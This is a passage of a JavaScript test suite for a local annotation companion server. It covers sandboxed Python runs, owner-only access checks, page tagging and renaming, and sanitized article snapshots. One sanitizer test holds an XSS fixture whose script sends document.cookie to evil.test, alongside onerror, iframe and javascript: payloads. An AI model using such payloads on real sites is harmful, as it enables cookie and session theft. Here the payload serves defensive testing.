    });

    await runTest('a run that will not stop is stopped, and says so', async () => {
      const at = await seed(py('import time\nprint("started", flush=True)\nwhile True:\n    time.sleep(0.05)'));
      const t0 = Date.now();
      const r = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.equal(r.json.run.status, 'timeout');
      assert.ok(Date.now() - t0 < 15000, 'and it was the timeout that ended it, not patience');
      assert.match(r.json.run.stdout, /started/, 'what it printed first is kept');
      assert.match(r.json.run.stderr, /stopped after 2s/);
    });

    await runTest('output is cut at 64KB, and the note says it was', async () => {
      const at = await seed(py('import sys\nsys.stdout.write("x" * 200000)\nsys.stderr.write("y" * 200000)'));
      const r = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.equal(r.json.run.stdout_truncated, true);
      assert.equal(r.json.run.stderr_truncated, true);
      assert.ok(r.json.run.stdout.length < 70000, `kept ${r.json.run.stdout.length} bytes`);
      assert.match(r.json.run.stdout, /…truncated \(200000 bytes of output in all\)$/);
    });

    await runTest('nothing a run left behind survives the message it belonged to', async () => {
      const at = await seed(py('print("keep me for a moment")'));
      const id = (await POST(rb, '/run', { ...at, block_index: 0 })).json.run.run_id;
      assert.ok(fs.existsSync(runDirOf(id)));
      await POST(rb, '/delete', { url: PAGE1, thread_id: at.thread_id, ts: at.ts });
      assert.equal(fs.existsSync(runDirOf(id)), false, 'deleting the message deletes its run');

      const at2 = await seed(py('print("and this one for the page")'));
      const id2 = (await POST(rb, '/run', { ...at2, block_index: 0 })).json.run.run_id;
      await POST(rb, '/delete', { url: PAGE1, thread_id: at2.thread_id });
      assert.equal(fs.existsSync(runDirOf(id2)), false, 'and deleting the thread deletes its messages\' runs');

      const at3 = await seed(py('print("and this one for the whole page")'));
      const id3 = (await POST(rb, '/run', { ...at3, block_index: 0 })).json.run.run_id;
      await POST(rb, '/delete-page', { url: PAGE1 });
      assert.equal(fs.existsSync(path.join(runPlugin, 'runs', RKEY)), false,
        'and deleting the page takes the whole lot');
      assert.equal(fs.existsSync(runDirOf(id3)), false);
      await POST(rb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
    });

    await runTest('editing a message drops the results of code it no longer contains', async () => {
      const at = await seed(py('print("before the edit")'));
      const id = (await POST(rb, '/run', { ...at, block_index: 0 })).json.run.run_id;
      await POST(rb, '/edit', { url: PAGE1, thread_id: at.thread_id, ts: at.ts, text: py('print("after")') });
      const msg = await readMsg(at);
      assert.equal(msg.runs, undefined, 'a stale result under changed code is a lie');
      assert.equal(fs.existsSync(runDirOf(id)), false);
    });

    r0.proc.kill();

    // --- the opt-out ------------------------------------------------------
    await test('run_python:false takes the whole feature away', async () => {
      const offRoot = tmpRoot('run-off');
      const offDir = path.join(offRoot, '.botference', 'plugin');
      fs.mkdirSync(offDir, { recursive: true });
      fs.writeFileSync(path.join(offDir, 'config.json'),
        JSON.stringify({ author: 'angadh', run_python: false }, null, 2));
      const off = await startServer({ root: offRoot, args: ['--no-agents'] });
      const cfg = await GET(off.base, '/run');
      assert.equal(cfg.json.enabled, false, 'so the drawer never draws the button');
      await POST(off.base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
      const t = (await POST(off.base, '/thread', {
        url: PAGE1, quote: 'q', prefix: '', suffix: '', msg: { text: '```python\nprint(1)\n```' },
      })).json.thread;
      const r = await POST(off.base, '/run',
        { url: PAGE1, thread_id: t.id, ts: t.msgs[0].ts, block_index: 0 });
      assert.equal(r.status, 409);
      assert.match(r.json.error, /switched off/);
      assert.equal(fs.existsSync(path.join(offDir, 'runs')), false, 'and nothing ran');
      off.proc.kill();
    });

    // --- who may run anything at all --------------------------------------
    await test('running code is the owner\'s, and only ever the owner\'s', async () => {
      const hRoot = tmpRoot('run-hosted');
      const h = await startServer({
        root: hRoot, args: ['--hosted', '--no-agents'],
        env: { PLUGIN_PASSWORD: 'guest-pw', PLUGIN_OWNER_PASSWORD: 'owner-pw' },
      });
      const R = { host: 'discuss.botference.com' };
      await POST(h.base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
      const t = (await POST(h.base, '/thread', {
        url: PAGE1, quote: 'q', prefix: '', suffix: '', msg: { text: '```python\nprint(1)\n```' },
      })).json.thread;
      const body = { url: PAGE1, thread_id: t.id, ts: t.msgs[0].ts, block_index: 0 };
      const jar = cookieJar(await FORM(h.base, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, R));
      const asGuest = [
        ['a signed-in guest', { ...R, cookie: jar }],
        ['a guest on the shared password', { ...R, authorization: 'Bearer guest-pw', 'x-plugin-handle': 'ada' }],
        // the tunnel's own hop arrives from 127.0.0.1: Host and the proxy
        // headers are what separate it from the extension on this machine
        ['a request forwarded to the loopback port', { host: 'localhost', 'cf-connecting-ip': '203.0.113.9', cookie: jar }],
        ['…and one wearing only X-Forwarded-For', { host: '127.0.0.1', 'x-forwarded-for': '203.0.113.9', cookie: jar }],
      ];
      for (const [who, headers] of asGuest) {
        assert.equal((await POST(h.base, '/run', body, headers)).status, 403, who);
        assert.equal((await POST(h.base, '/run-cancel', body, headers)).status, 403, who);
        assert.equal((await GET(h.base, '/run', headers)).status, 403, `${who}: not even to ask`);
        assert.equal((await GET(h.base,
          `/run-figure?key=${crypto.createHash('sha1').update(PAGE1).digest('hex')}&run=r-aaaa-bbbbbb&name=plot.png`,
          headers)).status, 403, `${who}: and never a figure`);
      }
      assert.equal(fs.existsSync(path.join(hRoot, '.botference', 'plugin', 'runs')), false,
        'nothing a guest asked for ever started');
      // the owner, remotely, IS the owner: they authenticated as themselves
      const owner = { ...R, authorization: `Bearer ${'owner-pw'}` };
      assert.equal((await GET(h.base, '/run', owner)).status, 200,
        'the owner password works from anywhere — it is the owner');
      assert.equal((await GET(h.base, '/run')).status, 200, 'and localhost is the owner as ever');
      h.proc.kill();
    });
  }

  // --- organising the archive: kinds, names and tags ---------------------
  // Three small things about a RECORD rather than about a conversation: what
  // sort of document it is (so a list can be filtered), what the reader calls
  // it, and what they filed it under.
  {
    const oRoot = tmpRoot('organise');
    const oDir = path.join(oRoot, '.botference', 'plugin');
    fs.mkdirSync(oDir, { recursive: true });
    fs.writeFileSync(path.join(oDir, 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    const o = await startServer({ root: oRoot, args: ['--no-agents'] });
    const ART = 'https://ledger.test/2026/the-quiet-line';
    const PDF = 'https://arxiv.example/papers/2601.01234v2.pdf';
    const DOC = 'https://docs.google.com/document/d/1a2b3c4d5e6f7g8h/edit';
    const idx = async () => (await GET(o.base, '/index')).json;
    const rec = async u => (await GET(o.base, `/page?url=${encodeURIComponent(u)}`)).json;
    const key = u => crypto.createHash('sha1').update(u).digest('hex');

    await test('a page record knows what kind of document it is', async () => {
      // the adapter says so, on every visit — that is the authoritative answer
      await POST(o.base, '/page', { url: PDF, title: '2601.01234v2.pdf', site: 'arxiv.example', kind: 'pdf' });
      await POST(o.base, '/page', { url: DOC, title: 'Draft — chapter 3', site: 'docs.google.com', kind: 'gdocs' });
      await POST(o.base, '/page', { url: ART, title: 'The Quiet Line', site: 'ledger.test', kind: 'article' });
      assert.equal((await rec(PDF)).kind, 'pdf');
      assert.equal((await rec(DOC)).kind, 'gdocs');
      assert.equal((await rec(ART)).kind, 'article');
      const map = await idx();
      assert.deepEqual([map[key(PDF)].kind, map[key(DOC)].kind, map[key(ART)].kind],
        ['pdf', 'gdocs', 'article'], 'and the index carries it, which is what the lists read');
      // nonsense from a hand-edited client never becomes a kind
      await POST(o.base, '/page', { url: ART, title: 'The Quiet Line', kind: 'spreadsheet' });
      assert.equal((await rec(ART)).kind, 'article');
    });

    await test('a record written before kinds existed answers from its url', async () => {
      // exactly what is on disk for every page annotated before this shipped:
      // no `kind` on the record, and no `kind` on its index row
      const OLD_PDF = 'https://papers.example/old/2019-report.pdf';
      const OLD_DOC = 'https://docs.google.com/document/d/zzzzzzzzzz/edit';
      const OLD_ART = 'https://ledger.test/2019/an-old-piece';
      const map = {};
      for (const [u, title] of [[OLD_PDF, '2019-report.pdf'], [OLD_DOC, 'An old doc'], [OLD_ART, 'An old piece']]) {
        const k = key(u);
        fs.writeFileSync(path.join(oDir, 'pages', `${k}.json`), JSON.stringify({
          version: 1, url: u, title, site: 'x', created_at: '2019-01-01T00:00:00.000Z',
          updated_at: '2019-01-01T00:00:00.000Z', session_id: null, threads: [], page_chat: [],
        }));
        map[k] = { url: u, title, threads: 0, has_session: false, updated_at: '2019-01-01T00:00:00.000Z' };
      }
      const live = await idx();
      fs.writeFileSync(path.join(oDir, 'index.json'), JSON.stringify({ ...live, ...map }));
      assert.equal((await rec(OLD_PDF)).kind, 'pdf', 'a .pdf url is a PDF');
      assert.equal((await rec(OLD_DOC)).kind, 'gdocs', 'a Google Docs url is a Doc');
      assert.equal((await rec(OLD_ART)).kind, 'article', 'and everything else is honestly an article');
      const after = await idx();
      assert.deepEqual([after[key(OLD_PDF)].kind, after[key(OLD_DOC)].kind, after[key(OLD_ART)].kind],
        ['pdf', 'gdocs', 'article'], 'the index backfills on the way out, without a migration');
    });

    await test('POST /rename-page names a page, everywhere, and gives the name back', async () => {
      const r = await POST(o.base, '/rename-page', { url: PDF, title: '  Kolmogorov   flows  ' });
      assert.equal(r.status, 200);
      assert.equal(r.json.title, 'Kolmogorov flows', 'trimmed and collapsed');
      const page = await rec(PDF);
      assert.equal(page.custom_title, 'Kolmogorov flows');
      assert.equal(page.title, '2601.01234v2.pdf', 'the page\'s own name is kept underneath');
      assert.equal((await idx())[key(PDF)].title, 'Kolmogorov flows', 'the index is what every list draws');
      // a revisit refreshes the scraped title and must never undo the rename
      await POST(o.base, '/page', { url: PDF, title: '2601.01234v2.pdf', kind: 'pdf' });
      assert.equal((await rec(PDF)).custom_title, 'Kolmogorov flows');
      // …and emptying it is the way back
      const back = await POST(o.base, '/rename-page', { url: PDF, title: '   ' });
      assert.equal(back.json.title, '2601.01234v2.pdf');
      assert.equal((await rec(PDF)).custom_title, null);
      await POST(o.base, '/rename-page', { url: PDF, title: 'Kolmogorov flows' });
      const gone = await POST(o.base, '/rename-page', { url: 'https://nowhere.test/x', title: 'x' });
      assert.equal(gone.status, 404);
    });

    await test('POST /tag-page normalises what it stores', async () => {
      const r = await POST(o.base, '/tag-page', {
        url: PDF,
        tags: ['  fluids ', '#turbulence', 'Fluids', 'FLUIDS', '', '   ', 'read  later',
          'x'.repeat(60), 1, null, {}, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k'],
      });
      assert.equal(r.status, 200);
      const tags = r.json.tags;
      assert.equal(tags[0], 'fluids', 'trimmed');
      assert.equal(tags[1], 'turbulence', 'a leading # is Obsidian\'s spelling, not ours');
      assert.equal(tags.filter(t => t.toLowerCase() === 'fluids').length, 1, 'deduped case-insensitively');
      assert.equal(tags[2], 'read later', 'internal whitespace collapsed');
      assert.ok(tags.every(t => t.length <= 40), 'each one capped');
      assert.ok(tags.length <= 12, 'and the list capped');
      assert.deepEqual((await rec(PDF)).tags, tags);
      assert.deepEqual((await idx())[key(PDF)].tags, tags, 'the index carries them, for the filter');
      // a page with none carries no tags key in the index at all
      assert.equal((await idx())[key(ART)].tags, undefined);
      // …and clearing them is sending none
      await POST(o.base, '/tag-page', { url: PDF, tags: [] });
      assert.deepEqual((await rec(PDF)).tags, []);
      assert.equal((await idx())[key(PDF)].tags, undefined);
      await POST(o.base, '/tag-page', { url: PDF, tags: ['fluids', 'turbulence'] });
      // the reading room sends one comma-separated field, and means the same thing
      const formed = await POST(o.base, '/tag-page', { url: DOC, tags: 'chapter 3, drafts , drafts' });
      assert.deepEqual(formed.json.tags, ['chapter 3', 'drafts']);
    });

    await test('the library is not a page to be renamed or tagged', async () => {
      await POST(o.base, '/reply', { url: 'bfp://library', thread_id: '__page__', text: 'what have I read?' });
      for (const route of ['/rename-page', '/tag-page']) {
        const r = await POST(o.base, route, { url: 'bfp://library', title: 'Archive', tags: ['x'] });
        assert.equal(r.status, 400, route);
      }
    });

    await test('a page event is broadcast for a rename and for a tag', async () => {
      const es = openEvents(o.base);
      await waitFor(() => es.events.some(e => e.type === 'hello'), 'sse hello');
      const before = es.events.length;
      await POST(o.base, '/rename-page', { url: ART, title: 'The Quiet Line, revisited' });
      await POST(o.base, '/tag-page', { url: ART, tags: ['rail'] });
      await waitFor(() => es.events.slice(before).filter(e => e.type === 'page' && e.url === ART).length === 2,
        'both edits reach every open list');
      es.close();
    });

    // A PDF on the reader's own disk is identified by the SHA-256 of its bytes
    // (`bfp-pdf://sha256/<hex>`, adapters.js) rather than by a path, so that
    // moving or renaming the file keeps the comments. To this server that is
    // simply a url — which is a claim worth proving rather than assuming, since
    // "identity is a string" is exactly the sort of thing that turns out to
    // have an `https?` regex hiding behind it. One round trip, every route the
    // extension uses.
    await test('a local PDF is a page like any other, filed under its bytes', async () => {
      const LOCAL = 'bfp-pdf://sha256/' + 'c'.repeat(64);
      const up = await POST(o.base, '/page', {
        url: LOCAL, title: 'The Quiet Machine', site: 'local pdf', kind: 'pdf',
        file_name: 'The Quiet Machine.pdf',
      });
      assert.equal(up.status, 200);
      assert.equal(up.json.url, LOCAL, 'normUrl leaves the pseudo-url byte-identical');
      assert.equal(up.json.site, 'local pdf', 'and not "sha256", which is what a hostname would say');
      assert.equal(up.json.file_name, 'The Quiet Machine.pdf');
      assert.equal(up.json.kind, 'pdf');

      const t = await POST(o.base, '/thread', {
        url: LOCAL, quote: 'control without possession', prefix: '', suffix: '',
        page: 3, msg: { text: 'the thesis, in five words' },
      });
      assert.equal(t.status, 200);
      assert.equal(t.json.thread.page, 3);
      const snap = await POST(o.base, '/snapshot', {
        url: LOCAL, html: '<section><h2>Page 3</h2><p>control without possession</p></section>',
      });
      assert.equal(snap.json.stored, true, 'the phone reads the text, never the file');
      assert.equal((await POST(o.base, '/rename-page', { url: LOCAL, title: 'Quiet' })).json.title, 'Quiet');
      assert.deepEqual((await POST(o.base, '/tag-page', { url: LOCAL, tags: ['control'] })).json.tags, ['control']);

      const row = (await idx())[key(LOCAL)];
      assert.equal(row.kind, 'pdf');
      assert.equal(row.title, 'Quiet', 'the rename is what every list draws');
      assert.deepEqual(row.tags, ['control']);

      // …and the reading room serves it: a heading that is not a link, because
      // the identity is not an address anybody could follow
      const p = await GET(o.base, `/p/${key(LOCAL)}`);
      assert.equal(p.status, 200);
      assert.ok(p.body.includes('<h1>Quiet</h1>'), 'no dead <a> around the name');
      assert.equal((await GET(o.base, `/a/${key(LOCAL)}`)).status, 200);
      const pages = await GET(o.base, '/pages');
      assert.ok(pages.body.includes('on your Mac'), 'the list says where it is, not 64 hex characters');
      assert.ok(!pages.body.includes('bfp-pdf://'), 'and never shows the hash');

      // the note: filed under the identity (which is what a re-export matches
      // on) and naming the file, which is the only part a person can use
      const ex = await POST(o.base, '/export', { url: LOCAL });
      assert.equal(ex.status, 200);
      const note = fs.readFileSync(ex.json.path, 'utf8');
      assert.ok(note.includes(`url: ${LOCAL}`), note);
      assert.ok(note.includes('file: The Quiet Machine.pdf'), note);
      assert.ok(note.includes('# Quiet'), note);
      assert.ok(note.includes('> — p. 3'), note);

      // the same file, opened again from somewhere else on the disk under
      // another name: the same page, the same comments, and the new name
      const again = await POST(o.base, '/page', {
        url: LOCAL, title: 'The Quiet Machine', site: 'local pdf', kind: 'pdf',
        file_name: 'quiet-machine-final.pdf',
      });
      assert.equal(again.json.threads.length, 1, 'the comment made before the move is still there');
      assert.equal(again.json.custom_title, 'Quiet', 'and the rename survived it');
      assert.equal(again.json.file_name, 'quiet-machine-final.pdf', 'under whatever it is called now');
    });

    // The Adobe incident, end to end over HTTP. A record filed under the
    // file's BYTES, then the file re-saved by Acrobat: the new bytes match
    // nothing the companion ever saw — but the WORDS still do, and the
    // companion recomputes their hash from the snapshot it kept. The first
    // ask under the text identity migrates the record, chat and all.
    await test('an old byte-hash record is adopted onto the text identity, chat intact', async () => {
      const OLDPDF = 'bfp-pdf://sha256/' + 'd'.repeat(64);
      await POST(o.base, '/page', {
        url: OLDPDF, title: 'Boundary Layers', site: 'local pdf', kind: 'pdf',
        file_name: 'boundary.pdf',
      });
      const t = await POST(o.base, '/thread', {
        url: OLDPDF, quote: 'the log law', prefix: '', suffix: '', msg: { text: 'check this' },
      });
      await POST(o.base, '/reply', { url: OLDPDF, thread_id: t.json.thread.id, text: 'second thought' });
      await POST(o.base, '/tag-page', { url: OLDPDF, tags: ['fluids'] });
      await POST(o.base, '/snapshot', {
        url: OLDPDF,
        html: '<section><h2>Page 1</h2><p>the log law of the wall<br>holds in the overlap region</p></section>',
      });
      // what the viewer hashes: the same lines, normalized — page labels are
      // the viewer's chrome and are not part of the words
      const norm = 'the log law of the wall holds in the overlap region';
      const TEXTURL = 'bfp-pdf://text/' + crypto.createHash('sha256').update(norm).digest('hex');
      const adopted = await rec(TEXTURL);          // GET /page — the first ask migrates
      assert.equal(adopted.url, TEXTURL, 'the record answers under the text identity');
      assert.equal(adopted.threads[0].msgs.length, 2, 'the chat came whole');
      assert.deepEqual(adopted.tags, ['fluids'], 'tags too');
      assert.equal(adopted.file_name, 'boundary.pdf');
      assert.deepEqual(adopted.prior_urls, [OLDPDF], 'and it remembers what it used to be called');
      const map = await idx();
      assert.ok(map[key(TEXTURL)], 'the index row moved');
      assert.equal(map[key(OLDPDF)], undefined, 'and the old row went with it');
      assert.equal((await rec(OLDPDF)).page, null, 'nothing files under the dead bytes any more');
      // the snapshot moved with the record: the phone still reads the paper
      const a = await GET(o.base, `/a/${key(TEXTURL)}`);
      assert.equal(a.status, 200);
      assert.ok(a.body.includes('log law of the wall'), 'served under the new key');
      // asking again is a plain read, not a second migration
      assert.equal((await rec(TEXTURL)).url, TEXTURL);
      // …and a text hash nothing matches adopts nothing and creates nothing
      const stranger = 'bfp-pdf://text/' + crypto.createHash('sha256').update('entirely other words').digest('hex');
      assert.equal((await rec(stranger)).page, null, 'a revised document is a fresh page, not a graft');
    });

    // A rename that costs the vault a duplicate is a rename not worth having —
    // the same rule for an identity migration: the note the byte-hash identity
    // wrote is REPLACED, found through prior_urls, never " (2)"-ed.
    await test('the Obsidian note follows an adoption instead of duplicating', async () => {
      const OLD2 = 'bfp-pdf://sha256/' + 'e'.repeat(64);
      await POST(o.base, '/page', { url: OLD2, title: 'Vortex Shedding', site: 'local pdf', kind: 'pdf' });
      await POST(o.base, '/thread', {
        url: OLD2, quote: 'Strouhal', prefix: '', suffix: '', msg: { text: 'a note' },
      });
      await POST(o.base, '/snapshot', {
        url: OLD2, html: '<section><h2>Page 1</h2><p>the Strouhal number stays near 0.2</p></section>',
      });
      const first = await POST(o.base, '/export', { url: OLD2 });
      assert.equal(first.status, 200);
      const T2 = 'bfp-pdf://text/' +
        crypto.createHash('sha256').update('the Strouhal number stays near 0.2').digest('hex');
      assert.equal((await rec(T2)).url, T2, 'adopted');
      const second = await POST(o.base, '/export', { url: T2 });
      assert.equal(second.json.path, first.json.path, 'one page, one note, whatever it was keyed by');
      const note = fs.readFileSync(second.json.path, 'utf8');
      assert.ok(note.includes(`url: ${T2}`), 'the frontmatter carries the current identity');
      assert.ok(!fs.existsSync(first.json.path.replace(/\.md$/, ' (2).md')), 'no variant was minted');
    });

    // Lazy persistence, the companion's half: reads never create. The
    // extension no longer POSTs /page on a visit, so the only thing left that
    // could quietly file a browsing history is a read path that writes — and
    // there isn't one.
    await test('a page nobody acted on has no record, no row, and 404s by key', async () => {
      const GHOST = 'https://search.example/results?q=vortex';
      const gk = key(GHOST);
      assert.equal((await rec(GHOST)).page, null, 'GET /page answers null…');
      assert.equal(fs.existsSync(path.join(oDir, 'pages', `${gk}.json`)), false, '…and creates nothing');
      assert.equal((await idx())[gk], undefined, 'no index row either');
      assert.equal((await GET(o.base, `/p/${gk}`)).status, 404, 'the conversation view says unknown');
      assert.equal((await GET(o.base, `/a/${gk}`)).status, 404, 'so does the article view');
    });
    o.proc.kill();

    // --- and both are the OWNER's ----------------------------------------
    await test('renaming and tagging are owner-only, through every guest shape', async () => {
      const hRoot = tmpRoot('organise-hosted');
      const h = await startServer({
        root: hRoot, args: ['--hosted', '--no-agents'],
        env: { PLUGIN_PASSWORD: 'guest-pw', PLUGIN_OWNER_PASSWORD: 'owner-pw' },
      });
      const R = { host: 'discuss.botference.com' };
      await POST(h.base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test', kind: 'article' });
      const jar = cookieJar(await FORM(h.base, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, R));
      const asGuest = [
        ['a signed-in guest', { ...R, cookie: jar }],
        ['a guest on the shared password', { ...R, authorization: 'Bearer guest-pw', 'x-plugin-handle': 'ada' }],
        // the tunnel's hop arrives from 127.0.0.1 like the extension's: Host
        // and the Cloudflare headers are the whole of the difference
        ['a request forwarded to the loopback port', { host: 'localhost', 'cf-connecting-ip': '203.0.113.9', cookie: jar }],
        ['…and one wearing only X-Forwarded-For', { host: '127.0.0.1', 'x-forwarded-for': '203.0.113.9', cookie: jar }],
      ];
      for (const [who, headers] of asGuest) {
        const ren = await POST(h.base, '/rename-page', { url: PAGE1, title: 'ada was here' }, headers);
        assert.equal(ren.status, 403, who);
        assert.deepEqual(ren.json, { ok: false, error: 'owner only — ask the owner to do that' }, who);
        const tag = await POST(h.base, '/tag-page', { url: PAGE1, tags: ['ada'] }, headers);
        assert.equal(tag.status, 403, who);
      }
      const still = (await GET(h.base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(still.custom_title, undefined, 'nothing a guest asked for was stored');
      assert.equal(still.tags, undefined);
      // the owner, remotely, is the owner
      const owner = { ...R, authorization: 'Bearer owner-pw' };
      assert.equal((await POST(h.base, '/rename-page', { url: PAGE1, title: 'Renamed remotely' }, owner)).status, 200);
      assert.equal((await POST(h.base, '/tag-page', { url: PAGE1, tags: ['rail'] }, owner)).status, 200);
      assert.equal((await POST(h.base, '/rename-page', { url: PAGE1, title: 'Renamed locally' })).status, 200,
        'and localhost is the owner as ever');
      // the reading room's own filters read the same rows
      const pages = await GET(h.base, '/pages?kind=article&tag=rail', { ...R, cookie: jar });
      assert.equal(pages.status, 200);
      assert.ok(pages.body.includes('Renamed locally'), 'the reader\'s name is the one the phone shows');
      const none = await GET(h.base, '/pages?kind=pdf', { ...R, cookie: jar });
      assert.ok(/Nothing here under this filter/.test(none.body), 'a filter that matches nothing says so');
      assert.ok(!/Renamed locally/.test(none.body), 'and shows nothing');
      h.proc.kill();
    });
  }

  // --- the article, readable (and markable) from a phone ------------------
  {
    const snapRoot = tmpRoot('snapshot');
    const snapDir = path.join(snapRoot, '.botference', 'plugin');
    fs.mkdirSync(snapDir, { recursive: true });
    fs.writeFileSync(path.join(snapDir, 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    const s = await startServer({
      root: snapRoot, args: ['--hosted', '--no-agents'],
      env: { PLUGIN_PASSWORD: 'guest-pw' },
    });
    const sb = s.base;
    const R = { host: 'discuss.botference.com' };
    const key = crypto.createHash('sha1').update(PAGE1).digest('hex');
    // the real fixture, as the extension would clone it: the whole article,
    // scripts and styling and all
    const fixture = fs.readFileSync(path.join(TEST, 'fixtures', 'article.html'), 'utf8');
    const ARTICLE = /<article[^>]*>([\s\S]*?)<\/article>/.exec(fixture)[1];
    // What the Mac's anchor.js indexes is the WHOLE page — site header, nav,
    // footer and all — while the phone only ever sees the article. Standing in
    // for buildTextIndex on both sides: strip the tags (and the non-prose
    // elements it skips), leave the words.
    const textOf = h => h
      .replace(/<(script|style)[\s\S]*?<\/\1>/gi, ' ')
      .replace(/<[^>]*>/g, ' ').replace(/&middot;/g, '·')
      .replace(/&amp;/g, '&').replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
    const WHOLE_PAGE = /<body[^>]*>([\s\S]*)<\/body>/.exec(fixture)[1];

    await POST(sb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });

    let guestCookie = '';
    await test('a guest cannot rewrite the article everyone else reads', async () => {
      const jar = cookieJar(await FORM(sb, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, R));
      guestCookie = jar;
      const r = await POST(sb, '/snapshot', { url: PAGE1, html: '<p>mine now</p>' }, { ...R, cookie: jar });
      assert.equal(r.status, 403);
      assert.equal(store_hasSnapshot(snapDir, key), false, 'and nothing was written');
    });

    await test('the owner\'s extension posts the article and it is sanitized on the way in', async () => {
      const r = await POST(sb, '/snapshot', { url: PAGE1, html: ARTICLE });
      assert.equal(r.status, 200);
      assert.equal(r.json.stored, true);
      assert.ok(r.json.bytes > 500, 'a real article arrived');
      const onDisk = fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8');
      assert.ok(!/<script/i.test(onDisk), 'no script survived to disk');
      assert.ok(!/ on[a-z]+=/i.test(onDisk), 'and no event handler either');
      assert.ok(onDisk.includes('<p>'), 'the prose did');
    });

    await test('a snapshot posted with something nasty in it is defused, not stored raw', async () => {
      const nasty = '<p>real prose</p><script>fetch("https://evil.test/"+document.cookie)</script>'
        + '<img src=x onerror="alert(1)"><iframe src="https://evil.test/"></iframe>'
        + '<a href="javascript:alert(1)">tap</a>';
      const r = await POST(sb, '/snapshot', { url: PAGE1, html: nasty });
      assert.equal(r.json.stored, true);
      const onDisk = fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8');
      assert.equal(onDisk, '<p>real prose</p><a rel="noreferrer noopener" target="_blank">tap</a>');
      // put the real article back for the rest of the block
      await POST(sb, '/snapshot', { url: PAGE1, html: ARTICLE });
    });

    await test('the article view serves the prose under a strict CSP', async () => {
      const r = await GET(sb, `/a/${key}`, { ...R, cookie: guestCookie, accept: 'text/html' });
      assert.equal(r.status, 200);
      const csp = r.headers['content-security-policy'];
      assert.match(csp, /default-src 'none'/);
      assert.match(csp, /script-src 'nonce-[A-Za-z0-9+/=]+'/, 'only scripts this page nonced');
      assert.ok(!/unsafe-inline/.test(csp), 'never unsafe-inline');
      assert.match(csp, /frame-ancestors 'none'/);
      assert.ok(r.body.includes('Sleeper services'), 'the article is there');
      assert.ok(r.body.includes('/assets/anchor.js'), 'anchored by the extension\'s own code');
      assert.ok(r.body.includes('/assets/reader.js'));
      const nonce = /script-src 'nonce-([^']+)'/.exec(csp)[1];
      assert.ok(r.body.includes(`nonce="${nonce}"`), 'and the nonce actually reaches the tags');
    });

    await test('the extension\'s anchoring code is served to the phone verbatim', async () => {
      const r = await GET(sb, '/assets/anchor.js', { ...R, cookie: guestCookie });
      assert.equal(r.status, 200);
      assert.match(r.headers['content-type'], /javascript/);
      assert.equal(r.body, fs.readFileSync(path.join(PLUGIN_DIR, 'extension', 'anchor.js'), 'utf8'),
        'byte for byte the same file the extension runs');
      assert.equal((await GET(sb, '/assets/../server.mjs', { ...R, cookie: guestCookie })).status, 404,
        'and nothing else is reachable through /assets');
    });

    await test('an unauthenticated visitor meets the gate, not the article', async () => {
      const r = await GET(sb, `/a/${key}`, { ...R, accept: 'text/html' });
      assert.equal(r.status, 401);
      assert.match(r.body, /<form method="POST" action="\/auth">/);
    });

    // THE round-trip: a highlight made on the phone, against the snapshot,
    // has to be findable in the page the Mac is looking at.
    let phoneThread = null;
    await test('a highlight made on the phone anchors in the original page', async () => {
      const snapText = textOf(fs.readFileSync(path.join(snapDir, 'snapshots', `${key}.html`), 'utf8'));
      const pageText = textOf(WHOLE_PAGE);
      assert.ok(pageText.length > snapText.length + 40,
        'the phone sees the article; the Mac sees the whole page around it');
      assert.ok(pageText.includes('Infrastructure') && !snapText.includes('Infrastructure'),
        'the site chrome is exactly the difference');
      // the phone picks a sentence out of the snapshot, exactly as reader.js does
      const at = snapText.indexOf('The economics');
      assert.ok(at > 0, 'fixture sentence present');
      const anchor = Anchor.buildAnchor(snapText, at, at + 60);
      const r = await POST(sb, '/thread', {
        url: PAGE1, quote: anchor.quote, prefix: anchor.prefix, suffix: anchor.suffix,
        msg: { text: 'read this on the train' },
      }, { ...R, cookie: guestCookie });
      assert.equal(r.status, 200);
      phoneThread = r.json.thread;
      assert.equal(phoneThread.msgs[0].author, 'ada', 'authored by whoever made it');
      // …and now the Mac, looking at the untouched article, finds it
      const found = Anchor.locate(pageText, phoneThread);
      assert.equal(found.ok, true, 'the extension would re-anchor this thread');
      assert.equal(pageText.slice(found.start, found.end).replace(/\s+/g, ' '),
        phoneThread.quote.replace(/\s+/g, ' '), 'and land on the very same words');
    });

    await test('the phone-made thread is an ordinary thread everywhere else', async () => {
      const page = (await GET(sb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.ok(page.threads.some(t => t.id === phoneThread.id));
      const conv = await GET(sb, `/p/${key}`, { ...R, cookie: guestCookie, accept: 'text/html' });
      assert.ok(conv.body.includes('read this on the train'));
      assert.match(conv.body, new RegExp(`href="/a/${key}"`), 'and the conversation links to the article');
      const list = await GET(sb, '/pages', { ...R, cookie: guestCookie, accept: 'text/html' });
      assert.match(list.body, new RegExp(`href="/a/${key}"`), 'the list opens the article itself now');
    });

    await test('a page with no snapshot degrades to an explanation, not a broken view', async () => {
      await POST(sb, '/page', { url: PAGE2, title: 'Unsnapped', site: 'x.test' });
      const k2 = crypto.createHash('sha1').update(PAGE2).digest('hex');
      const r = await GET(sb, `/a/${k2}`, { ...R, cookie: guestCookie, accept: 'text/html' });
      assert.equal(r.status, 200);
      assert.match(r.body, /No readable copy of this article has been captured yet/);
      assert.match(r.body, /Open it once on the Mac/, 'and says what fixes it');
      assert.match(r.body, new RegExp(`href="/p/${k2}"`), 'with the comments still one tap away');
      assert.ok(!r.body.includes('/assets/reader.js'), 'no reader where there is nothing to read');
    });

